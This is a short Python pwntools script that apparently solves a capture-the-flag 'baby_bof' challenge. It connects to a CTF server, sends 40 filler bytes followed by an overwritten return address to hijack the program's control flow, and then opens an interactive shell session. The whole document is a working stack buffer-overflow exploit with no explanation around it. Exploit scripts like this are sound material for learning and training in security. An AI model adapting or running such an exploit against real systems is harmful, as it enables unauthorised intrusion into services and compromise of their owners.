from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11001
p = remote(host, port)
#p = process('./baby_bof')
print p.recvline()

p.sendline("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" + "\x4d\x06\x40\x00" + "\x00\x00\x00\x00")

p.interactive()

